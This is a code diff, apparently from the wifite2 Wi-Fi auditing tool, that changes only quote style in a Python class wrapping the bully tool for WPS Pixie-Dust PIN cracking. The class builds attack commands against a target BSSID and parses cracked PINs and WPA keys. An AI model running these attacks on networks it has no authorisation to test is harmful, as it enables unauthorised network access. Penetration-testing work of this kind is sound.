@@ -23,7 +23,7 @@ class Bully(Attack, Dependency):
         self.total_timeouts = 0
         self.total_failures = 0
         self.locked = False
-        self.state = "{O}Waiting for beacon{W}"
+        self.state = '{O}Waiting for beacon{W}'
         self.start_time = time.time()
 
         self.cracked_pin = self.cracked_key = self.cracked_bssid = self.cracked_essid = None
@@ -35,17 +35,17 @@ class Bully(Attack, Dependency):
 
         if Process.exists('stdbuf'):
             self.cmd.extend([
-                "stdbuf", "-o0" # No buffer. See https://stackoverflow.com/a/40453613/7510292
+                'stdbuf', '-o0' # No buffer. See https://stackoverflow.com/a/40453613/7510292
             ])
 
         self.cmd.extend([
-            "bully",
-            "--bssid", target.bssid,
-            "--channel", target.channel,
-            "--detectlock", # Detect WPS lockouts unreported by AP
-            "--force",
-            "-v", "4",
-            "--pixiewps",
+            'bully',
+            '--bssid', target.bssid,
+            '--channel', target.channel,
+            '--detectlock', # Detect WPS lockouts unreported by AP
+            '--force',
+            '-v', '4',
+            '--pixiewps',
             Configuration.interface
         ])
 
@@ -58,7 +58,7 @@ class Bully(Attack, Dependency):
                       skip_wps=True,
                       output_file_prefix='wps_pin') as airodump:
             # Wait for target
-            self.pattack("Waiting for target to appear...")
+            self.pattack('Waiting for target to appear...')
             self.target = self.wait_for_target(airodump)
 
             # Start bully
@@ -111,7 +111,7 @@ class Bully(Attack, Dependency):
                 raise e
 
         if self.crack_result is None:
-            self.pattack("{R}Failed{W}", newline=True)
+            self.pattack('{R}Failed{W}', newline=True)
 
 
     def pattack(self, message, newline=False):
@@ -119,12 +119,12 @@ class Bully(Attack, Dependency):
         time_left = Configuration.wps_pixie_timeout - self.running_time()
 
         Color.clear_entire_line()
-        Color.pattack("WPS",
+        Color.pattack('WPS',
                 self.target,
                 'Pixie-Dust',
                 '{W}[{C}%s{W}] %s' % (Timer.secs_to_str(time_left), message))
         if newline:
-            Color.pl("")
+            Color.pl('')
 
 
     def running_time(self):
@@ -136,13 +136,13 @@ class Bully(Attack, Dependency):
 
         meta_statuses = []
         if self.total_timeouts > 0:
-            meta_statuses.append("{O}Timeouts:%d{W}" % self.total_timeouts)
+            meta_statuses.append('{O}Timeouts:%d{W}' % self.total_timeouts)
 
         if self.total_failures > 0:
-            meta_statuses.append("{O}WPSFail:%d{W}" % self.total_failures)
+            meta_statuses.append('{O}WPSFail:%d{W}' % self.total_failures)
 
         if self.locked:
-            meta_statuses.append("{R}Locked{W}")
+            meta_statuses.append('{R}Locked{W}')
 
         if len(meta_statuses) > 0:
             main_status += ' (%s)' % ', '.join(meta_statuses)
@@ -151,13 +151,13 @@ class Bully(Attack, Dependency):
 
 
     def parse_line_thread(self):
-        for line in iter(self.bully_proc.pid.stdout.readline, b""):
-            if line == "": continue
-            line = line.replace("\r", "").replace("\n", "").strip()
+        for line in iter(self.bully_proc.pid.stdout.readline, b''):
+            if line == '': continue
+            line = line.replace('\r', '').replace('\n', '').strip()
 
             if Configuration.verbose > 1:
                 Color.pe('\n{P} [bully:stdout] %s' % line)
-                
+
             self.state = self.parse_state(line)
 
             self.crack_result = self.parse_crack_result(line)
@@ -189,9 +189,9 @@ class Bully(Attack, Dependency):
 
             if self.cracked_pin is not None:
                 # Mention the PIN & that we're not done yet.
-                self.pattack("{G}Cracked PIN: {C}%s{W}" % self.cracked_pin, newline=True)
+                self.pattack('{G}Cracked PIN: {C}%s{W}' % self.cracked_pin, newline=True)
 
-                self.state = "{G}Finding PSK...{C}"
+                self.state = '{G}Finding PSK...{C}'
                 time.sleep(2)
 
         ###########################
@@ -201,13 +201,13 @@ class Bully(Attack, Dependency):
             self.cracked_key = key_re.group(1)
 
         if not self.crack_result and self.cracked_pin and self.cracked_key:
-            self.pattack("{G}Cracked PSK: {C}%s{W}" % self.cracked_key, newline=True)
+            self.pattack('{G}Cracked PSK: {C}%s{W}' % self.cracked_key, newline=True)
             self.crack_result = CrackResultWPS(
                     self.target.bssid,
                     self.target.essid,
                     self.cracked_pin,
                     self.cracked_key)
-            Color.pl("")
+            Color.pl('')
             self.crack_result.dump()
 
         return self.crack_result
@@ -220,14 +220,14 @@ class Bully(Attack, Dependency):
         got_beacon = re.search(r".*Got beacon for '(.*)' \((.*)\)", line)
         if got_beacon:
             # group(1)=ESSID, group(2)=BSSID
-            state = "Got beacon"
+            state = 'Got beacon'
 
         # [+] Last State = 'NoAssoc'   Next pin '48855501'
         last_state = re.search(r".*Last State = '(.*)'\s*Next pin '(.*)'", line)
         if last_state:
             # group(1)=result, group(2)=PIN
             pin = last_state.group(2)
-            state = "Trying PIN {C}%s{W} (%s)" % (pin, last_state.group(1))
+            state = 'Trying PIN {C}%s{W} (%s)' % (pin, last_state.group(1))
 
         # [+] Tx( Auth ) = 'Timeout'   Next pin '80241263'
         mx_result_pin = re.search(r".*[RT]x\(\s*(.*)\s*\) = '(.*)'\s*Next pin '(.*)'", line)
@@ -238,42 +238,42 @@ class Bully(Attack, Dependency):
             result = mx_result_pin.group(2) # NoAssoc, WPSFail, Pin1Bad, Pin2Bad
             pin = mx_result_pin.group(3)
 
-            if result == "Timeout":
+            if result == 'Timeout':
                 self.total_timeouts += 1
-                result = "{O}%s{W}" % result
-            elif result == "WPSFail":
+                result = '{O}%s{W}' % result
+            elif result == 'WPSFail':
                 self.total_failures += 1
-                result = "{O}%s{W}" % result
-            elif result == "NoAssoc":
-                result = "{O}%s{W}" % result
+                result = '{O}%s{W}' % result
+            elif result == 'NoAssoc':
+                result = '{O}%s{W}' % result
             else:
-                result = "{R}%s{W}" % result
+                result = '{R}%s{W}' % result
 
-            result = "{P}%s{W}:%s" % (m_state.strip(), result.strip())
-            state = "Trying PIN {C}%s{W} (%s)" % (pin, result)
+            result = '{P}%s{W}:%s' % (m_state.strip(), result.strip())
+            state = 'Trying PIN {C}%s{W} (%s)' % (pin, result)
 
         # [!] WPS lockout reported, sleeping for 43 seconds ...
         re_lockout = re.search(r".*WPS lockout reported, sleeping for (\d+) seconds", line)
         if re_lockout:
             self.locked = True
             sleeping = re_lockout.group(1)
-            state = "{R}WPS Lock-out: {O}Waiting %s seconds{W}" % sleeping
+            state = '{R}WPS Lock-out: {O}Waiting %s seconds{W}' % sleeping
 
         # [Pixie-Dust] WPS pin not found
         re_pin_not_found = re.search(r".*\[Pixie-Dust\] WPS pin not found", line)
         if re_pin_not_found:
-            state = "{R}Failed: {O}Bully says 'WPS pin not found'{W}"
+            state = '{R}Failed: {O}Bully says "WPS pin not found"{W}'
 
         # [+] Running pixiewps with the information, wait ...
         re_running_pixiewps = re.search(r".*Running pixiewps with the information", line)
         if re_running_pixiewps:
-            state = "{G}Running pixiewps...{W}"
+            state = '{G}Running pixiewps...{W}'
 
         return state
 
 
     def stop(self):
-        if hasattr(self, "pid") and self.pid and self.pid.poll() is None:
+        if hasattr(self, 'pid') and self.pid and self.pid.poll() is None:
             self.pid.interrupt()
 
 
@@ -283,7 +283,7 @@ class Bully(Attack, Dependency):
 
     @staticmethod
     def get_psk_from_pin(target, pin):
-        # Fetches PSK from a Target assuming "pin" is the correct PIN
+        # Fetches PSK from a Target assuming 'pin' is the correct PIN
         '''
         bully --channel 1 --bssid 34:21:09:01:92:7C --pin 01030365 --bruteforce wlan0mon
         PIN   : '01030365'
@@ -319,7 +319,7 @@ if __name__ == '__main__':
     fields = '34:21:09:01:92:7C,2015-05-27 19:28:44,2015-05-27 19:28:46,1,54,WPA2,CCMP TKIP,PSK,-58,2,0,0.0.0.0,9,AirLink89300,'.split(',')
     target = Target(fields)
     psk = Bully.get_psk_from_pin(target, '01030365')
-    print("psk", psk)
+    print('psk', psk)
 
     '''
     stdout = " [*] Pin is '11867722', key is '9a6f7997'"
